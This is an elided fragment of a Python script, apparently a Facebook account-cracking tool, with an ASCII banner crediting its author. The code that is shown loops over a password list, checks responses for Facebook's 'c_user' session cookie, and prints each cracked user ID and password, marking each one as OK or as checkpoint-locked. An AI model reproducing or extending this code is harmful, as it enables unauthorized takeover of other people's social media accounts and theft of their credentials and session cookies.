...
░      ░     ░░   ░  ▒ ░ ░ ░  ░  ░░░ ░ ░   ░ ░      
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝙈𝙧➪𝗕𝗵𝗮𝗶𝗬𝗮                 %s║"%(Z,B,M,Z))
	print("%s║%s  Github   :  https://github.com/J4NAYED-BRUH %s║"%(Z,B,Z))
	print("%s║%s  Facebook : JUNAYED HASNAT MRIDUL        %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [JUNAYED-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [JUNAYED-CP] '+uidx+' | '+pasw+'\033[0;97m')
